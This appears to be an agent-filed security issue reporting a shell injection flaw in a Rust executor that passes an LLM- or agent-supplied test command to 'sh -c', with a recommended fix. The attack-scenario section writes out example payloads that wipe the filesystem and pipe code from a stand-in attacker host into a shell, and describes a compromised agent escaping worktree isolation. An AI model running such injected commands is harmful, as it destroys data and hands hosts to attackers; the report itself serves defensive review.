---
title: "🛡️ Sentinel: [CRITICAL] Arbor HTR Shell Injection Vulnerability"
labels: ["architecture-review", "adversarial", "bug", "agent-found"]
---

# Vulnerability Report: Shell Injection in Arbor HTR Loop

## Finding
The Arbor HTR Parallel Verification Loop (`mythrax-core/src/cognitive/executor.rs`) executes candidate changes and tests using raw POSIX shell invocation (`sh -c`) on unescaped `test_command` strings within git worktrees.

## Current Assumption
The `test_command` provided by the LLM or agent is safe, well-formed, and strictly bounded to running tests within the target repository.

## Attack Scenario
An adversarial input or a compromised agent injects shell metacharacters (e.g., `; rm -rf /` or `| curl attacker.com/malware | sh`) into the `test_command`. The `sh -c` execution blindly runs this payload, breaking out of the intended git worktree isolation and executing arbitrary commands on the host.

## Blast Radius
**Remote Code Execution (RCE)** on the host machine. Complete compromise of the host environment, bypassing all intended agent scope boundaries and isolation mechanisms.

## Recommended Structural Change
Remove `sh -c` entirely. Parse the test command and arguments safely and pass them directly to `std::process::Command::new(cmd).args(args)`, avoiding shell evaluation entirely. Furthermore, execute HTR loops within a robust sandbox (e.g., Docker or Firecracker) rather than relying solely on git worktrees for isolation.

---
*Note: Do not close this issue without a documented Architectural Decision Record (ADR) response.*